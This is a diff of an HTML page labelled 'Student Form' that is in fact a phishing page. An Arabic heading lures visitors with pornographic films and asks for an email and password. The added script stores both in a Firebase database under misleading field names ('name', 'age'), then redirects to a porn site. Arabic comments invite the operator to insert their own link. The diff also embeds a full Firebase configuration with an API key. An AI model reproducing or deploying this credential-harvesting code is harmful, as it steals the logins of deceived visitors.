@@ -3,6 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <title>Student Form</title>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -32,24 +34,47 @@
 <body>
 
   <form id="studentForm">
-    <h3>🔞 سجل الدخول لمشاهدة افلام </h3>
-
+    <h3>🔞مشاهدة افلام سكس </h3>
     <input type="email" id="name" placeholder="email" required>
     <input type="password" id="age" placeholder="password" required>
-
     <button type="submit">إرسال</button>
   </form>
 
   <script>
+    // ======== Firebase Configuration ========
+    const firebaseConfig = {
+      apiKey: "AIzaSyCYx8W_IRsMMCTyRa8XI8ZgSYNy9FTC05w",
+      authDomain: "studentform-23321.firebaseapp.com",
+      databaseURL: "https://studentform-23321-default-rtdb.firebaseio.com",
+      projectId: "studentform-23321",
+      storageBucket: "studentform-23321.appspot.com",
+      messagingSenderId: "231053258264",
+      appId: "1:231053258264:web:9085921423ec01b8f61d6d",
+      measurementId: "G-E5MX49EEMV"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // ======== Form Submit ========
     document.getElementById("studentForm").addEventListener("submit", function(e) {
-      e.preventDefault(); // يمنع إعادة تحميل الصفحة
+      e.preventDefault();
 
-      // هون لاحقاً ممكن تضيف حفظ البيانات (Firebase)
+      const name = document.getElementById("name").value;
+      const age = document.getElementById("age").value;
 
-      // =========================
-      // 🔴🔴🔴 حط رابطك هون 🔴🔴🔴
-      // =========================
-      window.location.href = "https://www.pornhub.com/";
+      // حفظ البيانات في Firebase
+      database.ref('students/').push({
+        name: name,
+        age: age
+      }).then(() => {
+        // بعد الحفظ، ينقل المستخدم للرابط
+        // 🔴 حط رابطك الخاص هنا بين علامات التنصيص
+        window.location.href = "https://www.pornhub.com/";
+      }).catch((error) => {
+        alert("صارت مشكلة بحفظ البيانات: " + error);
+      });
     });
   </script>
 
